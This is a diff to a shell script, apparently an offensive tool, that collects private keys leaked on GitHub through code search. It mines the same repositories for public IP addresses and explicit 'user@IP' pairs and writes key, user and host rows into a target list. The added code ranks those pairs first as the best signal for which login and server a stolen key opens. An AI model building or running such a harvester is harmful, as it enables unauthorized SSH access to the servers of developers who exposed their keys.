@@ -48,6 +48,10 @@ IP_RE='\b(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[
 # RFC1918 + CGNAT + link-local + TEST-NET + multicast/reserved + public DNS
 IP_DROP='^(0\.|10\.|100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.0\.2\.|192\.168\.|198\.51\.100\.|203\.0\.113\.|22[4-9]\.|2[3-5][0-9]\.)'
 IP_NOISE='^(1\.0\.0\.1|1\.1\.1\.1|4\.2\.1\.1|4\.2\.2\.[1-6]|4\.4\.4\.4|8\.8\.4\.4|8\.8\.8\.8|9\.9\.9\.9|114\.114\.114\.114|208\.67\.(220|222)\.22[02]|223\.5\.5\.5)$'
+# A repo that literally writes "user@1.2.3.4" (deploy script, ssh config, README)
+# names BOTH the host and the login. That beats guessing users against an
+# arbitrary IP, so those pairs are emitted first and logged to pairs.txt.
+USER_AT_RE='[A-Za-z_][A-Za-z0-9_-]*@([0-9]{1,3}\.){3}[0-9]{1,3}'
 rank_ips() {
     grep -vE "$IP_DROP" | grep -vE "$IP_NOISE" | sort | uniq -c | sort -rn | awk '{print $2}'
 }
@@ -63,6 +67,11 @@ repo_hosts() {
              --include='hosts' --include='Dockerfile*' --include='*compose*' \
              "$d" 2>/dev/null | rank_ips > "$d/t1" || true
         grep -rshoE "$IP_RE" "$d" 2>/dev/null | rank_ips > "$d/t2" || true
+        # precise pass: explicit user@host pairs, best signal in the repo
+        grep -rshoE "$USER_AT_RE" "$d" 2>/dev/null | sort -u \
+            | awk -F@ -v drop="$IP_DROP" -v noise="$IP_NOISE" \
+                  '{ if ($NF ~ drop || $NF ~ noise) next; print }' \
+            | head -n "$HOSTS_PER_REPO" > "$WORK/last.userip" || true
         cat "$d/t1"
         if [ -s "$d/t1" ]; then
             grep -vxF -f "$d/t1" "$d/t2" 2>/dev/null || true
@@ -79,7 +88,7 @@ harvest() {
         echo "hunt: no GITHUB_TOKEN (GitHub code search requires auth)" >&2
         return 0
     fi
-    : > "$WORK/urls.txt"; : > "$WORK/repos.txt"
+    : > "$WORK/urls.txt"; : > "$WORK/repos.txt"; : > "$WORK/pairs.txt"
     # NOTE: each search result carries three html_urls - owner, repository and
     # the file itself. Only the file one contains /blob/, so keep just those,
     # otherwise an org URL can register a repo name and shadow the real key URL.
@@ -120,6 +129,14 @@ harvest() {
         chmod 0600 "$keyfile"
 
         hosts=$(repo_hosts "$repo" | head -n "$HOSTS_PER_REPO")
+        # precise rows first, and kept for inspection in pairs.txt
+        if [ -s "$WORK/last.userip" ]; then
+            while IFS=@ read -r pu ph; do
+                [ -n "${ph:-}" ] || continue
+                printf '%s\t%s\t%s\n' "$keyfile" "$pu" "$ph"
+                printf '%s\t%s\t%s\n' "$keyfile" "$pu" "$ph" >> "$WORK/pairs.txt"
+            done < "$WORK/last.userip" >> "$TARGETS"
+        fi
         [ -n "$hosts" ] || continue
         printf '%s\n' "$hosts" | while read -r h; do
             for u in $TARGET_USERS; do
